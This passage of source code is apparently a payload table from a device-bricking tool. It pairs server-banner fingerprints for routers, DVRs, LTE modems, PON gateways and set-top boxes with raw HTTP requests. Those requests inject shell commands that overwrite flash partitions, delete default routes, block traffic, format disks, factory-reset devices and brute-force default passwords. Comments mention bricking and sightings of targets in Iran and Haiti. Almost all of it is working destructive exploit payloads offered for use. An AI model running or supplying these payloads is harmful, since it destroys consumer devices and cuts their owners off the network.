	  'POST /html/network/setcfg.cgi?y=InternetGatewayDevice.LANDevice.1.LANHostConfigManagement&x=InternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1&RequestFile=html/network/dhcp.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: LoginTimes=0:LoginOverTime=0; rememberme=0; Username=%%LOGIN%%; Password=%%PASSWORD%%; FirstMenu=Admin_1; SecondMenu=Admin_1_1; ThirdMenu=Admin_1_1_2; sessionID=%%CUSTOM1%%; Language=English\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nx.IPInterfaceIPAddress=10.%%RAND8%%&x.IPInterfaceSubnetMask=255.255.255.0&y.MinAddress=10.%COMP8%%&y.MaxAddress=10.%%COMP8%%&y.X_ATP_STB-MinAddress=0.0.0.0&y.X_ATP_STB-MaxAddress=0.0.0.0&y.X_ATP_STB-DHCPRelay=0&y.X_ATP_STB-DHCPOption60=&y.DNSServers=&y.DomainName=&y.UseAllocatedWAN=&y.AssociatedConnection=&y.PassthroughMACAddress=&y.DHCPLeaseTime=86400&y.DHCPServerEnable=1&y.X_ATP_DHCPRelayEnable=0&y.X_ATP_DHCPRelayLAN1=0&y.X_ATP_DHCPRelayLAN2=0&y.X_ATP_DHCPRelayLAN3=0&y.X_ATP_DHCPRelayLAN4=0&y.X_ATP_DHCPRelaySSID1=0&y.X_ATP_DHCPRelaySSID2=0&y.X_ATP_DHCPRelaySSID3=0&y.X_ATP_DHCPRelaySSID4=0',
	  'POST /html/network/setcfg.cgi?x=InternetGatewayDevice.LANDevice.1&y=InternetGatewayDevice.LANDevice.1.WLANConfiguration.1&k=InternetGatewayDevice.LANDevice.1.WLANConfiguration.1&RequestFile=html/network/wlan.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: LoginTimes=0:LoginOverTime=0; rememberme=0; Username=%%LOGIN%%; Password=%%PASSWORD%%; FirstMenu=Admin_1; SecondMenu=Admin_1_1; ThirdMenu=Admin_1_1_0; sessionID=%%CUSTOM1%%; Language=English\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ny.Standard=b%2Fg%2Fn&y.MaxBitRate=Auto&y.X_ATP_11NHtMcs=33&y.Enable=1&y.Channel=0&y.X_ATP_SSIDHide=0&y.X_ATP_WlanQosControl=0&y.X_ATP_WlanAPISOControl=0&y.X_ATP_Wlan11NBWControl=20&y.X_ATP_Wlan11NGIControl=short&y.SSID=HACKED&y.RegulatoryDomain=EG&y.X_ATP_AssociateDeviceNum=126&y.X_ATP_PowerValue=10&y.BeaconType=WPAand11i&y.X_ATP_WPSControl=0&y.X_ATP_WPSMode=ap-pbc&k.PreSharedKey.1.PreSharedKey=13041963&y.WPAWPA2EncryptionModes=TKIPandAESEncryption&x.X_ATP_WLANEnable=1',
	  'GET /html/management/excutecmd.cgi?cmd=%60cat+/dev/urandom+%3E/dev/mtdblock0%60&RequestFile=html/management/diagnose.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: LoginTimes=0:LoginOverTime=0; rememberme=0; Username=%%LOGIN%%; Password=%%PASSWORD%%; FirstMenu=Admin_3; SecondMenu=Admin_3_2; ThirdMenu=Admin_3_2_0; sessionID=%%CUSTOM1%%; Language=English\r\n\r\n',
	  'GET /html/management/excutecmd.cgi?cmd=%60cat+/dev/urandom+%3E/dev/mtdblock3%60&RequestFile=html/management/diagnose.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: LoginTimes=0:LoginOverTime=0; rememberme=0; Username=%%LOGIN%%; Password=%%PASSWORD%%; FirstMenu=Admin_3; SecondMenu=Admin_3_2; ThirdMenu=Admin_3_2_0; sessionID=%%CUSTOM1%%; Language=English\r\n\r\n',
	  'GET /html/management/excutecmd.cgi?cmd=%60cat+/dev/urandom+%3E/dev/mtdblock1%60&RequestFile=html/management/diagnose.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: LoginTimes=0:LoginOverTime=0; rememberme=0; Username=%%LOGIN%%; Password=%%PASSWORD%%; FirstMenu=Admin_3; SecondMenu=Admin_3_2; ThirdMenu=Admin_3_2_0; sessionID=%%CUSTOM1%%; Language=English\r\n\r\n',
	  'GET /html/management/excutecmd.cgi?cmd=%60cat+/dev/urandom+%3E/dev/mtdblock2%60&RequestFile=html/management/diagnose.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: LoginTimes=0:LoginOverTime=0; rememberme=0; Username=%%LOGIN%%; Password=%%PASSWORD%%; FirstMenu=Admin_3; SecondMenu=Admin_3_2; ThirdMenu=Admin_3_2_0; sessionID=%%CUSTOM1%%; Language=English\r\n\r\n',
	  'GET /html/management/excutecmd.cgi?cmd=%60cat+/dev/urandom+%3E/dev/mtdblock4%60&RequestFile=html/management/diagnose.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: LoginTimes=0:LoginOverTime=0; rememberme=0; Username=%%LOGIN%%; Password=%%PASSWORD%%; FirstMenu=Admin_3; SecondMenu=Admin_3_2; ThirdMenu=Admin_3_2_0; sessionID=%%CUSTOM1%%; Language=English\r\n\r\n',
	  'GET /html/management/excutecmd.cgi?cmd=%60cat+/dev/urandom+%3E/dev/mtdblock5%60&RequestFile=html/management/diagnose.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: LoginTimes=0:LoginOverTime=0; rememberme=0; Username=%%LOGIN%%; Password=%%PASSWORD%%; FirstMenu=Admin_3; SecondMenu=Admin_3_2; ThirdMenu=Admin_3_2_0; sessionID=%%CUSTOM1%%; Language=English\r\n\r\n',
	  'GET /html/management/excutecmd.cgi?cmd=%60iptables+-A+OUTPUT+-j+DROP%60&RequestFile=html/management/diagnose.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: LoginTimes=0:LoginOverTime=0; rememberme=0; Username=%%LOGIN%%; Password=%%PASSWORD%%; FirstMenu=Admin_3; SecondMenu=Admin_3_2; ThirdMenu=Admin_3_2_0; sessionID=%%CUSTOM1%%; Language=English\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
	],
	
	[ 'zxdsl831', 'microhttpd.*realm=DSL Router;',
		'GET /connoppp.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /connoppp.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /ntwkprtcl.cgi?enblAutoScan=0&portId=0&atmVpi=0&atmVci=65533&enblQos=0&quickSetup=1&serviceId=1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /ntwkprtcl.cgi?enblAutoScan=0&portId=0&atmVpi=0&atmVci=65533&enblQos=0&quickSetup=1&serviceId=1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /wancfg.cgi?ntwkPrtcl=2&encapMode=1&enVlanMux=0&vlanMuxId=-1&serviceName=mer_0_65533 HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /wancfg.cgi?ntwkPrtcl=2&encapMode=1&enVlanMux=0&vlanMuxId=-1&serviceName=mer_0_65533 HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /lancfg.cgi?ntwkPrtcl=2&enblDhcpClnt=0&enblAuto=0&wanIpAddress=10.%%RAND8%%&wanSubnetMask=255.255.255.0&defaultGateway=10.%%COMP8%%&wanIfName=&dnsPrimary=1.1.2.2&dnsSecondary=1.1.3.3&dnsDynamic=0&serviceName=mer_0_65533&enblNat=0&enblUPnP=0&enblFirewall=1&enblQos=0 HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /lancfg.cgi?ntwkPrtcl=2&enblDhcpClnt=0&enblAuto=0&wanIpAddress=10.%%RAND8%%&wanSubnetMask=255.255.255.0&defaultGateway=10.%%COMP8%%&wanIfName=&dnsPrimary=1.1.2.2&dnsSecondary=1.1.3.3&dnsDynamic=0&serviceName=mer_0_65533&enblNat=0&enblUPnP=0&enblFirewall=1&enblQos=0 HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /ntwksum2.cgi?ethIpAddress=1.2.3.4&ethSubnetMask=255.255.255.248&enblLan2=1&lan2IpAddress=1.2.3.5&lan2SubnetMask=255.255.255.252&enblDhcpSrv=0 HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /ntwksum2.cgi?ethIpAddress=1.2.3.4&ethSubnetMask=255.255.255.248&enblLan2=1&lan2IpAddress=1.2.3.5&lan2SubnetMask=255.255.255.252&enblDhcpSrv=0 HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /rebootinfo.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
		'GET /rebootinfo.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
	],
	
	[ 'engenius', 'lighttpd.*web\/jquery\.js.*getlanguagejs\.htm',
		'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1\r\nHost: %%TARGETIP%%:%%TARGETPORT%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naction=7&path=\"|cat /dev/urandom >/dev/mtdblock6||\"',
		'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1\r\nHost: %%TARGETIP%%:%%TARGETPORT%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naction=7&path=\"|cat /dev/urandom >/dev/mtdblock4||\"',
		'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1\r\nHost: %%TARGETIP%%:%%TARGETPORT%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naction=7&path=\"|cat /dev/urandom >/dev/root||\"',
		'POST /web/cgi-bin/usbinteract.cgi HTTP/1.1\r\nHost: %%TARGETIP%%:%%TARGETPORT%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naction=7&path=\"|route del default||\"',
    'GET / HTTP/1.0\r\n\r\n',
	],
	
	[ 'crossweb', 'Cross Web Server',
		'GET /language/Swedish${IFS}&&mkdosfs${IFS}${HOME}dev${HOME}mtd0${IFS}9999${IFS}&>r&&tar${IFS}/string.js HTTP/1.0\r\n\r\n',
		'GET /language/Swedish${IFS}&&mkdosfs${IFS}${HOME}dev${HOME}mtd1${IFS}9999${IFS}&>r&&tar${IFS}/string.js HTTP/1.0\r\n\r\n',
		'GET /language/Swedish${IFS}&&mkdosfs${IFS}${HOME}dev${HOME}mtd2${IFS}9999${IFS}&>r&&tar${IFS}/string.js HTTP/1.0\r\n\r\n',
		'GET /language/Swedish${IFS}&&mkdosfs${IFS}${HOME}dev${HOME}root${IFS}9999${IFS}&>r&&tar${IFS}/string.js HTTP/1.0\r\n\r\n',
		'GET /language/Swedish${IFS}&&route${IFS}del${IFS}default&&tar${IFS}/string.js HTTP/1.0\r\n\r\n',
		'GET /language/Swedish${IFS}&&reboot&&tar${IFS}/string.js HTTP/1.0\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
	],  

  # hanbang gaoke DVR API, (suspiciously) similar to hikvision ISAPI standard
  [ 'hanbang', 'Server: NVR Webserver',
    # this is supposedly a password reset exploit so let's just run it first
    'PUT /ISAPI/Security/users/1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nX-Requested-With: XMLHttpRequest\r\nAuthorization: Basic YWRtaW46ODg4ODg4\r\nCookie: updateTips=true; streamType=0; BufferLever=1; userInfo%%TARGETPORT%%=YWRtaW46ODg4ODg4; DevID=5; language=en; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<User><id>1</id><userName>admin</userName><password>admin</password><bondIpList><bondIp><id>1</id><ipAddress>0.0.0.0</ipAddress><ipv6Address>::</ipv6Address></bondIp></bondIpList><macAddress/><userLevel>administrator</userLevel><attribute><inherent>true</inherent></attribute></User>',
    # then do the usual brute forcing stuff here
    'GET /ISAPI/Security/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46ODg4ODg4\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/888888
    'GET /ISAPI/Security/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/admin
    'GET /ISAPI/Security/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNDU2\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/123456
    'GET /ISAPI/Security/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MDAwMDAw\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/000000
    'GET /ISAPI/Security/userCheck HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46MTIzNDU2Nzg=\r\nCookie: language=en; updateTips=true\r\n\r\n', # admin/12345678
    # update overlay names for first 4 cameras
    'PUT /ISAPI/System/Video/inputs/channels/1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%; DevID=5; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<ChannleName version="1.0" xmlns="http://www.isapi.org/ver20/XMLSchema"><name>HACKED</name></ChannleName>',
    'PUT /ISAPI/System/Video/inputs/channels/2 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%; DevID=5; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<ChannleName version="1.0" xmlns="http://www.isapi.org/ver20/XMLSchema"><name>HACKED</name></ChannleName>',
    'PUT /ISAPI/System/Video/inputs/channels/3 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%; DevID=5; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<ChannleName version="1.0" xmlns="http://www.isapi.org/ver20/XMLSchema"><name>HACKED</name></ChannleName>',
    'PUT /ISAPI/System/Video/inputs/channels/4 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%; DevID=5; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<ChannleName version="1.0" xmlns="http://www.isapi.org/ver20/XMLSchema"><name>HACKED</name></ChannleName>',
    # format hd :)
    'PUT /ISAPI/ContentMgmt/Storage/hdd/SATA1/format HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%; DevID=5; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n',
    'PUT /ISAPI/ContentMgmt/Storage/hdd/1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%; DevID=5; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><hdd><id>1</id><hddName>SATA</hddName><hddType>SATA</hddType><status>ok</status><capacity>953869</capacity><freeSpace>944128</freeSpace><property>RO</property></hdd>',
    # change lan ip
  	'PUT /ISAPI/System/Network/interfaces/1?auth=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%; DevID=5; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<NetworkInterface><id>1</id><IPAddress><ipVersion>dual</ipVersion><addressingType>static</addressingType><ipAddress>10.%%RAND8%%</ipAddress><subnetMask>255.255.255.0</subnetMask><DefaultGateway><ipAddress>10.%%COMP8%%</ipAddress></DefaultGateway><PrimaryDNS><ipAddress>1.2.3.4</ipAddress></PrimaryDNS><SecondaryDNS><ipAddress>1.2.3.5</ipAddress></SecondaryDNS></IPAddress><Link><MACAddress>8c:e7:48:35:ad:e4</MACAddress><autoNegotiation>true</autoNegotiation><speed>0</speed><duplex>full</duplex><MTU>1500</MTU></Link></NetworkInterface>',
  	# disable upnp
  	'PUT /ISAPI/System/Network/interfaces/1?auth=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%; DevID=5; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<UPnP version="1.0" xmlns="http://www.isapi.org/ver20/XMLSchema"><enabled>false</enabled><status>scansucc</status><LANAddress>10.%%RAND8%%</LANAddress><WANAddress>10.%%COMP8%%</WANAddress></UPnP>',
  	# factory reset
  	'PUT /ISAPI/System/factoryReset/mode=full HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%; DevID=5; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n',
  	# reboot
  	'PUT /ISAPI/System/reboot HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nX-Requested-With: XMLHttpRequest\r\nCookie: language=en; updateTips=true; userInfo%%TARGETPORT%%=%%CUSTOM1%%; DevID=5; curpage=paramconfig.asp%254\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 0\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
  ],

  # HiWEB ALR LTE CPE things.. Not sure what these are, noticed them in June 2020 and these were only inside Iran.
  # The operator cleaned up its act around 4th of July (yay). Later, a bit over a dozen of these turned up in 
  # IP space which apparently is in Haiti. Not seen them since..
  [ 'hiwebalr', 'Server: WebsServer',
'POST /goform/formLogin HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nloginName=admin&loginPassword=admin',
'POST /goform/setLan_s HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/idu/bodysetting_lan.asp\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nlanIp=10.%%RAND8%%&lanNetmask=255.255.255.0&lanDhcpType=SERVER&dhcpStart=10.%%COMP8%%&dhcpEnd=10.%%COMP8%%&dhcpPriDns=10.1.1.1&dhcpSecDns=&dhcpGateway=10.%%COMP8%%&dhcpLease=86400&dhcpStatic1=&dhcpStatic1Mac=&dhcpStatic1Ip=&dhcpStatic2=&dhcpStatic2Mac=&dhcpStatic2Ip=&dhcpStatic3=&dhcpStatic3Mac=&dhcpStatic3Ip=&dhcpStatic4=&dhcpStatic4Mac=&dhcpStatic4Ip=&dhcpStatic5=&dhcpStatic5Mac=&dhcpStatic5Ip=',
'POST /goform/addRouting HTTP/1.1\r\nHost: %%TARGETIP%%\r\nReferer: http://%%TARGETIP%%/internet/routing.asp\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\ndest=0.0.0.0&hostnet=net&netmask=0.0.0.0&gateway=%60cat%20/dev/zero%20>/dev/root%60&interface=WAN&custom_interface=&comment=&addFilterPort=Apply',
'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
  ],

  # Dasan HPON thingy, no idea if bricking attempt works but gets device offline at least
  # Note: Some false positive matches with below
	[ 'dasanpon', '(PON Home Gateway|HTTP/1.1 200 OK;Pragma: no-cache;Cache-Control: no-cache;Content-Type: text/html; charset=utf-8)',
	 'POST /GponForm/diag_Form?script/ HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(cat+/dev/zero+>/dev/mtdblock0;cat+/dev/zero+>/dev/mtdblock1;cat+/dev/zero+>/dev/mtdblock2;cat+/dev/zero+>/dev/mtdblock3;cat+/dev/zero+>/dev/mtdblock4;cat+/dev/zero+>/dev/mtdblock5;cat+/dev/zero+>/dev/mtdblock6)&ipv=0' ,
	 'POST /GponForm/diag_Form?script/ HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(cat+/dev/zero+>/dev/root)&ipv=0' ,
	 'POST /GponForm/mac_filter_Form?images/ HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nXWebPageName=mac_filter&macfltenable=on&macfltlist=&macfltmode=1',
	 'POST /GponForm/diag_Form?script/ HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(route+del+default)&ipv=0' ,
	 'POST /GponForm/LoginForm HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nXWebPageName=devinfo&username=admin&password=admin',
   # cant be bothered to add proper login logic here.. just try a few common defaults..
	 'POST /GponForm/mac_filter_Form HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nXWebPageName=mac_filter&macfltenable=on&macfltlist=&macfltmode=1',
	 'POST /GponForm/LoginForm HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nXWebPageName=devinfo&username=root&password=admin',
	 'POST /GponForm/mac_filter_Form HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nXWebPageName=mac_filter&macfltenable=on&macfltlist=&macfltmode=1',
	 'POST /GponForm/LoginForm HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nXWebPageName=devinfo&username=admin&password=password',
	 'POST /GponForm/mac_filter_Form HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nXWebPageName=mac_filter&macfltenable=on&macfltlist=&macfltmode=1',
	 'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n' ,
	],

  # TwistedWeb set top box thingies
  [ 'twistedweb', 'TwistedWeb',
    'GET /webadmin/script?command=|route%20del%20default%3Bcat%20/dev/zero%20%3E/dev/mtdblock0%3Bcat%20/dev/zero%20%3E/dev/mtdblock1%3Bcat%20/dev/zero%20%3E/dev/mtdblock2%3Bcat%20/dev/zero%20%3E/dev/mtdblock3%3Bcat%20/dev/zero%20%3E/dev/ubi0_1%3Bhalt HTTP/1.0\r\n\r\n',
    'GET /api/saveconfig?key=__import__(%27os%27).system(%27route%20del%20default%3Bcat%20/dev/zero%20%3E/dev/mtdblock0%3Bcat%20/dev/zero%20%3E/dev/mtdblock1%3Bcat%20/dev/zero%20%3E/dev/mtdblock2%3Bcat%20/dev/zero%20%3E/dev/mtdblock3%3Bcat%20/dev/zero%20%3E/dev/root%20%26%27)&value=10&_=1493919932 HTTP/1.0\r\n\r\n',
    # double tap just in case
    'GET /webadmin/script?command=|route%20del%20default%3Bcat%20/dev/zero%20%3E/dev/mtdblock0%3Bcat%20/dev/zero%20%3E/dev/mtdblock1%3Bcat%20/dev/zero%20%3E/dev/mtdblock2%3Bcat%20/dev/zero%20%3E/dev/mtdblock3%3Bcat%20/dev/zero%20%3E/dev/ubi0_1%3Bhalt HTTP/1.0\r\n\r\n',
    'GET /api/saveconfig?key=__import__(%27os%27).system(%27route%20del%20default%3Bcat%20/dev/zero%20%3E/dev/mtdblock0%3Bcat%20/dev/zero%20%3E/dev/mtdblock1%3Bcat%20/dev/zero%20%3E/dev/mtdblock2%3Bcat%20/dev/zero%20%3E/dev/mtdblock3%3Bcat%20/dev/zero%20%3E/dev/root%20%26%27)&value=10&_=1493919932 HTTP/1.0\r\n\r\n',
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
  ],

  # Merit Lilin cmd injection
  [ 'lilin3520', '(Basic realm=DVR.*charset=%s)',
  # try common default auths until we get a 200 OK
  'GET / HTTP/1.0\r\nAuthorization: Basic cm9vdDppY2F0Y2g5OQ==\r\n\r\n',
  'GET / HTTP/1.0\r\nAuthorization: Basic YWRtaW46MTIzNDU2\r\n\r\n',
  'GET / HTTP/1.0\r\nAuthorization: Basic cmVwb3J0OjhKZzBTUjhLNTA=\r\n\r\n',
  'POST /dvr/cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: %%BODYLENGTH%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nUser-Agent: Test\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&busybox cat /dev/zero>/dev/mtdblock0"/></Service></DVR>]]></SetConfiguration></DVR>',
  'POST /dvr/cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: %%BODYLENGTH%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nUser-Agent: Test\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&busybox cat /dev/zero>/dev/mtdblock1"/></Service></DVR>]]></SetConfiguration></DVR>',
  'POST /dvr/cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: %%BODYLENGTH%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nUser-Agent: Test\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&busybox cat /dev/zero>/dev/mtdblock2"/></Service></DVR>]]></SetConfiguration></DVR>',
  'POST /dvr/cmd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAccept-Encoding: gzip, deflate\r\nContent-Length: %%BODYLENGTH%%\r\nAuthorization: Basic %%CUSTOM1%%\r\nUser-Agent: Test\r\n\r\n<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&busybox cat /dev/zero>/dev/mtdblock3"/></Service></DVR>]]></SetConfiguration></DVR>',
